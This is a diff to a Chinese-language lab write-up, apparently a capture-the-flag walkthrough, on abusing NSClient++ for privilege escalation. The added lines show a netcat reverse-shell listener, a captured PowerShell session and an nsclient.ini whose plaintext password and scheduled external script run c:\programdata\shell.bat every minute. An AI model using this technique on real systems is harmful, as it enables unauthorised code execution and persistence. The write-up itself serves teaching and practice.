@@ -671,3 +671,53 @@ listening on [any] 443 ...
 #### 首先，我们必须转到NSClient++的settings选项卡，以便创建一个新脚本。
 #### Settings -> settings -> external scripts -> scripts -> 
 ![图片](images/2026020904.png)
+```
+ [★]$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [85.9.194.108] from (UNKNOWN) [109.105.210.100] 38719
+��A�Gai���-������	��
+/5�
+�$�#�
+�	�(�'���=<5/
+���+�/�.
+
+
+�┌//目标是用 HTTPS 连你，那你现在用的：nc -lvnp 443❌ 不行，因为 nc 不会解 TLS。
+```
+
+_________
+```
+PS C:\Users\Nadine> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+PS C:\Program Files\NSClient++> gc nsclient.ini
+
+; in flight - TODO
+[/settings/default]
+
+; Undocumented key
+password = ew2x6SsGTxjRwXOT
+
+; Undocumented key
+allowed hosts = 127.0.0.1
+<SNIP>; in flight - TODO
+[/settings/external scripts/scripts/11]
+; COMMAND - Command to execute
+command =  c:\\programdata\\shell.bat
+
+; in flight - TODO[/settings/scheduler/schedules/11]
+
+; SCHEDULE COMMAND - Command to execute
+command = 11
+
+; SCHEDULE INTERAVAL - Time in seconds between each check
+interval = 1m
+PS C:\Program Files\NSClient++>
+```
